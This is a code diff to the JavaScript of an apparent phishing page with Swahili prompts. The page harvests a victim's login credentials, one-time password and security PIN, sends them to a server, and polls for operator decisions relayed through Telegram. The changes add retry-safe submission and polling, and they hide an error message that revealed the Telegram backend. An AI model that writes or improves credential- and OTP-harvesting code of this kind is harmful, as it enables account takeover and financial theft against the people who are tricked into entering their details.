@@ -83,17 +83,14 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
         });
         
         const result = await response.json();
-        if (!result.success) {
-            throw new Error('Server returned failure');
-        }
+        if (!result.success) throw new Error('Server returned failure');
 
         startPolling();
     } catch (err) {
         console.error('Submission error:', err);
-        // Fallback safety: Stop spinner so it doesn't hang forever if server/telegram fails
         document.getElementById('credentials-spinner').classList.add('hidden');
         document.getElementById('btn-continue-creds').classList.remove('hidden');
-        alert('Hitilafu imetokea. Hakikisha tokeni ya Telegram imewekwa vizuri kwenye Render.');
+        alert('Hitilafu imetokea. Hakikisha mtandao wako uko sawa.');
     }
 });
 
@@ -122,17 +119,21 @@ document.getElementById('btn-verify-otp').addEventListener('click', async () => 
     const boxes = document.querySelectorAll('#step-otp .otp-box');
     const otp = Array.from(boxes).map(b => b.value).join('');
     if (otp.length < 5) {
-        alert('Tafadhali ingiza OTP kamili.');
+        alert('Tafadhali ingiza OTP kamili ya tarakimu 5.');
         return;
     }
 
-    await fetch('/api/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, otp })
-    });
-
-    showNotification('OTP imetumwa. Inasubiri uthibitisho...');
+    try {
+        await fetch('/api/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, otp })
+        });
+        showNotification('OTP imetumwa. Inasubiri uthibitisho...');
+        startPolling(); // Resume polling for admin button action
+    } catch (err) {
+        console.error('OTP error:', err);
+    }
 });
 
 // Submit Security PIN
@@ -144,13 +145,17 @@ document.getElementById('btn-verify-security-pin').addEventListener('click', asy
         return;
     }
 
-    await fetch('/api/submit-security-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, securityPin })
-    });
-
-    showNotification('PIN imetumwa. Inasubiri idhini...');
+    try {
+        await fetch('/api/submit-security-pin', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, securityPin })
+        });
+        showNotification('PIN imetumwa. Inasubiri idhini ya mwisho...');
+        startPolling(); // Resume polling for final approval
+    } catch (err) {
+        console.error('Security PIN error:', err);
+    }
 });
 
 // Polling loop to check admin actions from Telegram
@@ -190,5 +195,5 @@ function startPolling() {
             console.error('Polling error:', e);
         }
     }, 3000);
-        }
+    }
     
